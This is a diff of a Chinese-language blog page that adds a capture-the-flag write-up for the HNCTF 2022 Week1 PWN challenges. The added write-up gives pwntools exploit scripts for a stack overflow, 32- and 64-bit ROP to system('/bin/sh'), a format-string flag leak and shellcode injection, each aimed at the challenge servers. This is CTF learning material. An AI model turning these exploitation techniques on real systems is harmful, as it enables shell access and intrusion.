@@ -223,7 +223,7 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #ffa2c4; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #00a596; margin-right: 0.5rem;">PWN</a>
       </span>
       
     </span>
@@ -241,7 +241,57 @@
           <p>[HNCTF 2022 Week1] PWN 复现</p>
 <span id="more"></span>
 
+<h2 id="easync"><span id="easync">easync</span></h2><p>签到题，直接 <code>nc</code> 就行，但是这里有坑需要注意下，直接 <code>cat flag</code>，得到的是一个假的 flag，真的 flag 分为两部分，这点需要注意下。</p>
+<hr>
+<h2 id="easyoverflow"><span id="easyoverflow">easyoverflow</span></h2><p>简单的栈溢出，直接溢出就行，exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28487</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input something\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span> +<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<hr>
+<h2 id="ezcmp"><span id="ezcmp">ezcmp</span></h2><p>分析一下代码，发现 <code>buff</code> 被加密了，只需绕过这个 <code>if</code> 语句，就可以执行 <code>binsh</code> 了，问题是怎么绕过呢？gdb 调试来告诉你。</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p> 打断点，到enccrypt,通过调试可以发现被加密buff的地址，在观察其内容，就可以解决问题了，exp如下：</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28776</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x144678aadc0e4072</span>) + p64(<span class="number">0x84b6e81a4c7eb0e2</span>) + p64(<span class="number">0xf426588abcee2052</span>) + p64(<span class="number">0x0000c8cb2c5e90c2</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ezr0p32"><span id="ezr0p32">ezr0p32</span></h2><p>首先分析一下代码，可知出现了两个 <code>buf</code>，但是这两个 <code>buf</code> 的作用是不同的。第一个 <code>buf</code> 在 <code>.bss</code> 段，这样就可以把 <code>/bin/sh</code> 写进 <code>buf</code> 里面，然后执行 <code>system(&quot;/bin/sh&quot;)</code> 获得 flag。</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p>这里也需要注意32位程序和64位程序的传参规则，此题位32位程序，是通过栈传递，所以payload的格式有所不同，system + 垃圾数据 + binsh，这些需要自己去做题总结发现，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28224</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x804A080</span></span><br><span class="line">system=<span class="number">0x80483D0</span></span><br><span class="line"><span class="comment">#system=elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please tell me your name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;now it&#x27;s your play time~&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">0x4</span>) +p32(system) +p32(<span class="number">0</span>) +p32(buf)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ezr0p64"><span id="ezr0p64">ezr0p64</span></h2><p>分析可知给出了 <code>puts</code> 地址，可以据此推算 libc 基址，构造 <code>system</code> 和 <code>/bin/sh</code>，套路比较明显，直接上exp</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p> 至于payload的构造格式，就要了解64位程序的传参方式，前六个参数是通过rdi, rsi, rdx, rcx, r8, r9, 这六个寄存器，后续的参数通过栈传递，记住格式就行</p>
+<p>EXP 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28942</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4012a3</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span> +<span class="number">8</span>) +p64(ret_addr) +p64(rdi_addr) +p64(binsh) +p64(system)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Start your rop.&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="fmtstrre"><span id="fmtstrre">fmtstrre</span></h2><p>明显存在格式字符串漏洞</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
+<p>并发现偏移为 6</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p>gdb 调试，并注意 <code>.bss</code> 段 <code>name</code> 地址（存储了 flag），0x20 +6&#x3D;38，从而知道flag的位置</p>
+<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
+<blockquote>
+<p>%x 以十六进制打印，只能打印4字节，一般只用于32位</p>
+<p>%p 打印目标地址，建议32位和64位都用这个</p>
+<p>%s 打印地址内容 %c 打印单个字符</p>
+<p>%hhn 写一字节 %hn 写两字节</p>
+<p>%n 写四字节</p>
+<p>%ln 32位写四字节，64位写八字节</p>
+<p>%lln 写八字节</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./111&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28036</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your format string.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%38$s&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ret2shellcode"><span id="ret2shellcode">ret2shellcode</span></h2><p>经典的 shellcode 注入题，将 shellcode 写入 <code>.bss</code> 段：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28928</span>)</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">buff=<span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">payload=payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;A&#x27;</span>)+p64(buff)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="safe_shellcode"><span id="safe_shellcode">safe_shellcode</span></h2><p>这道题就难度，不太会，以后会了，再来改下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28840</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
         </div>
       
     </div>
@@ -328,7 +378,7 @@
           <div class="toc-header">
             <i class="fa-solid fa-list-ul"></i> 目录
           </div>
-          
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easync"><span class="toc-number">1.</span> <span class="toc-text">easync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyoverflow"><span class="toc-number">2.</span> <span class="toc-text">easyoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezcmp"><span class="toc-number">3.</span> <span class="toc-text">ezcmp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezr0p32"><span class="toc-number">4.</span> <span class="toc-text">ezr0p32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezr0p64"><span class="toc-number">5.</span> <span class="toc-text">ezr0p64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmtstrre"><span class="toc-number">6.</span> <span class="toc-text">fmtstrre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">7.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe_shellcode"><span class="toc-number">8.</span> <span class="toc-text">safe_shellcode</span></a></li></ol>
         </div>
       </div>
     </div>
